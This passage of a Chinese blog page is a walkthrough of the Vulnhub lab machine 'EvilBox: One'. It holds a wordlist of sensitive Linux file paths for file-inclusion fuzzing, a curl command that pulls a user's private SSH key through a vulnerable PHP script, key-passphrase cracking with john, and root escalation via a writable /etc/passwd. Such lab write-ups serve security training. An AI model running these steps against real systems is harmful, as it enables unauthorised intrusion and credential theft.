class="line">/proc/net/tcp</span><br><span class="line">/proc/net/udp</span><br><span class="line">/proc/pid/cmdline</span><br><span class="line">/proc/sched_debug</span><br><span class="line">/proc/self/cmdline</span><br><span class="line">/proc/self/cwd</span><br><span class="line">/proc/self/environ</span><br><span class="line">/proc/self/fd/0</span><br><span class="line">/proc/self/fd/1</span><br><span class="line">/proc/self/fd/10</span><br><span class="line">/proc/self/fd/11</span><br><span class="line">/proc/self/fd/12</span><br><span class="line">/proc/self/fd/13</span><br><span class="line">/proc/self/fd/14</span><br><span class="line">/proc/self/fd/15</span><br><span class="line">/proc/self/fd/16</span><br><span class="line">/proc/self/fd/17</span><br><span class="line">/proc/self/fd/18</span><br><span class="line">/proc/self/fd/19</span><br><span class="line">/proc/self/fd/2</span><br><span class="line">/proc/self/fd/20</span><br><span class="line">/proc/self/fd/21</span><br><span class="line">/proc/self/fd/22</span><br><span class="line">/proc/self/fd/23</span><br><span class="line">/proc/self/fd/24</span><br><span class="line">/proc/self/fd/25</span><br><span class="line">/proc/self/fd/26</span><br><span class="line">/proc/self/fd/27</span><br><span class="line">/proc/self/fd/28</span><br><span class="line">/proc/self/fd/29</span><br><span class="line">/proc/self/fd/3</span><br><span class="line">/proc/self/fd/30</span><br><span class="line">/proc/self/fd/31</span><br><span class="line">/proc/self/fd/32</span><br><span class="line">/proc/self/fd/33</span><br><span class="line">/proc/self/fd/34</span><br><span class="line">/proc/self/fd/35</span><br><span class="line">/proc/self/fd/4</span><br><span class="line">/proc/self/fd/5</span><br><span class="line">/proc/self/fd/6</span><br><span class="line">/proc/self/fd/7</span><br><span class="line">/proc/self/fd/8</span><br><span class="line">/proc/self/fd/9</span><br><span class="line">/proc/self/loginuid</span><br><span class="line">/proc/self/stat</span><br><span class="line">/proc/self/status</span><br><span class="line">/proc/verison</span><br><span class="line">/proc/version</span><br><span class="line">/proc/xxxx/cmdline</span><br><span class="line">/root/.atftp_history</span><br><span class="line">/root/.bash_history</span><br><span class="line">/root/.bashrc</span><br><span class="line">/root/.mysql_history</span><br><span class="line">/root/.nano_history</span><br><span class="line">/root/.php_history</span><br><span class="line">/root/.profile</span><br><span class="line">/root/.ssh/authorized_keys</span><br><span class="line">/root/.ssh/id_dsa</span><br><span class="line">/root/.ssh/id_dsa.pub</span><br><span class="line">/root/.ssh/id_ras.keystore</span><br><span class="line">/root/.ssh/id_rsa</span><br><span class="line">/root/.ssh/id_rsa.pub</span><br><span class="line">/root/.ssh/identity</span><br><span class="line">/root/.ssh/identity.pub</span><br><span class="line">/root/.ssh/known_hosts</span><br><span class="line">/root/.viminfo</span><br><span class="line">/root/.wget-hsts</span><br><span class="line">/root/anaconda-ks.cfg</span><br><span class="line">/tmp/apache/htdocs/index.html</span><br><span class="line">/tmp/apache/htdocs/index.php</span><br><span class="line">/usr/lib/php.ini</span><br><span class="line">/usr/lib/php/php.ini</span><br><span class="line">/usr/local/apache/conf/httpd.conf</span><br><span class="line">/usr/local/apache2/conf/httpd.conf</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf</span><br><span class="line">/usr/local/app/php5/lib/php.ini</span><br><span class="line">/usr/local/httpd/conf/httpd.conf</span><br><span class="line">/usr/local/lib/php.ini</span><br><span class="line">/usr/local/tomcat/conf/tomcat-users.xml</span><br><span class="line">/usr/share/tomcat6/bin/startup.sh</span><br><span class="line">/usr/tomcat6/bin/startup.sh</span><br><span class="line">/var/apache2/config.inc</span><br><span class="line">/var/httpd/conf/httpd.conf</span><br><span class="line">/var/httpd/conf/php.ini</span><br><span class="line">/var/httpd/htdocs/index.html</span><br><span class="line">/var/httpd/htdocs/index.php</span><br><span class="line">/var/lib/mlocate/mlocate.db</span><br><span class="line">/var/lib/mysql/my.cnf</span><br><span class="line">/var/lib/mysql/mysql/user.MYD</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/var/local/www/conf/httpd.conf</span><br><span class="line">/var/local/www/conf/php.ini</span><br><span class="line">/var/log/access.log</span><br><span class="line">/var/log/access_log</span><br><span class="line">/var/log/apache/access.log</span><br><span class="line">/var/log/apache/access_log</span><br><span class="line">/var/log/apache/error.log</span><br><span class="line">/var/log/apache/error_log</span><br><span class="line">/var/log/apache2/access.log</span><br><span class="line">/var/log/apache2/access_log</span><br><span class="line">/var/log/apache2/error.log</span><br><span class="line">/var/log/apache2/error_log</span><br><span class="line">/var/log/auth.log</span><br><span class="line">/var/log/chttp.log</span><br><span class="line">/var/log/cups/error_log</span><br><span class="line">/var/log/dpkg.log</span><br><span class="line">/var/log/error.log</span><br><span class="line">/var/log/error_log</span><br><span class="line">/var/log/faillog</span><br><span class="line">/var/log/httpd/access.log</span><br><span class="line">/var/log/httpd/access_log</span><br><span class="line">/var/log/httpd/error.log</span><br><span class="line">/var/log/httpd/error_log</span><br><span class="line">/var/log/lastlog</span><br><span class="line">/var/log/lighttpd/access.log</span><br><span class="line">/var/log/lighttpd/error.log</span><br><span class="line">/var/log/lighttpd/lighttpd.access.log</span><br><span class="line">/var/log/lighttpd/lighttpd.error.log</span><br><span class="line">/var/log/messages</span><br><span class="line">/var/log/mysql.log</span><br><span class="line">/var/log/mysql/mysql.log</span><br><span class="line">/var/log/mysql/mysql-bin.log</span><br><span class="line">/var/log/mysql/mysql-slow.log</span><br><span class="line">/var/log/mysqlderror.log</span><br><span class="line">/var/log/secure</span><br><span class="line">/var/log/syslog</span><br><span class="line">/var/log/wtmp</span><br><span class="line">/var/log/xferlog</span><br><span class="line">/var/log/yum.log</span><br><span class="line">/var/mail/root</span><br><span class="line">/var/mysql.log</span><br><span class="line">/var/run/utmp</span><br><span class="line">/var/spool/cron/crontabs/root</span><br><span class="line">/var/spool/mail/root</span><br><span class="line">/var/webmin/miniserv.log</span><br><span class="line">/var/www/conf/httpd.conf</span><br><span class="line">/var/www/htdocs/index.html</span><br><span class="line">/var/www/htdocs/index.php</span><br><span class="line">/var/www/html/</span><br><span class="line">/var/www/html/apache/conf/httpd.conf</span><br><span class="line">/var/www/html/index.html</span><br><span class="line">/var/www/index.html</span><br><span class="line">/var/www/index.php</span><br><span class="line">/var/www/logs/access.log</span><br><span class="line">/var/www/logs/access_log</span><br><span class="line">/var/www/logs/error.log</span><br><span class="line">/var/www/logs/error_log</span><br><span class="line">/var/www/phpmyadmin/config.inc.php</span><br><span class="line">/web/conf/php.ini</span><br><span class="line">/www/conf/httpd.conf</span><br><span class="line">/www/htdocs/index.html</span><br><span class="line">/www/htdocs/index.php</span><br><span class="line">/www/php/php.ini</span><br><span class="line">/www/php4/php.ini</span><br><span class="line">/www/php5/php.ini</span><br><span class="line">/xampp/apache/bin/php.ini</span><br><span class="line">/xampp/apache/conf/httpd.conf</span><br></pre></td></tr></table></figure>
+<p>结果</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403081635752.png" /></p>
+<p>由扫描得 mowree 下有 ssh
+登录的公钥【/home/mowree/.ssh/authorized_keys】和私钥【/home/mowree/.ssh/id_rsa】，为此下载私钥后如果能破解的话，即可以
+mowree 远程登录，下载破解测试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> id_rsa &amp;&amp; curl <span class="string">&quot;http://192.168.159.134/secret/evil.php?command=../../../../home/mowree/.ssh/id_rsa&quot;</span> &gt; id_rsa &amp;&amp; <span class="built_in">chmod</span> 600 id_rsa</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403081715325.png" /></p>
+<p>利用 ssh2john 转换成 john 可处理的格式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh2john id_rsa &gt; john_id_rsa</span><br></pre></td></tr></table></figure>
+<p>破解</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john john_id_rsa --wordlist=rockyou.txt</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403081718285.png" /></p>
+<p>得 unicorn</p>
+<h2 id="渗透攻击">2. 渗透攻击</h2>
+<h3 id="ssh-登录">2.1. ssh 登录</h3>
+<p>利用前面得到的私钥和密码远程登录靶机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mowree@192.168.159.134 -i id_rsa </span><br></pre></td></tr></table></figure>
+<p>得到第一个 flag</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403081721754.png" /></p>
+<h3 id="提权">2.2. 提权</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null <span class="comment"># 查suid</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br></pre></td></tr></table></figure>
+<p>无果……继续</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null  <span class="comment"># 查找具有写入权限的文件</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403081753008.png" /></p>
+<p>当前用户对 /etc/passwd 有写权限，或许可以添加个 root
+权限的用户或直接修改 root 的密码</p>
+<p>尝试修改 root 密码，利用 openssl 生成个密码并写入 passwd</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403081826946.png" /></p>
+<p>添加 root 权限的用户同理……</p>
+<blockquote>
+<p>推荐阅读：<a
+target="_blank" rel="noopener" href="https://www.cnblogs.com/shadow-/p/16878609.html">靶机:
+EvilBox---One - sha0dow - 博客园</a></p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Ghost
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://z9m8r8.github.io/2024/03/08/EvilBox%20One/" title="EvilBox: One">https://z9m8r8.github.io/2024/03/08/EvilBox One/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Vulnhub-%E9%9D%B6%E5%9C%BA/" rel="tag"><i class="fa fa-tag"></i> Vulnhub 靶场</a>
+              <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag"><i class="fa fa-tag"></i> 信息收集</a>
+              <a href="/tags/shell/" rel="tag"><i class="fa fa-tag"></i> shell</a>
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/03/08/Beelzebub%201/" rel="prev" title="Beelzebub: 1">
+                  <i class="fa fa-angle-left"></i> Beelzebub: 1
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/03/09/Hack%20Me%20Please%201/" rel="next" title="Hack Me Please: 1 ">
+                  Hack Me Please: 1  <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2020 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Ghost</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">187k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">11:19</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2024/03/08/EvilBox%20One/"}</script>
+  <script src="/js/third-party/quicklink.js"></script>
+
+</body>
+</html>
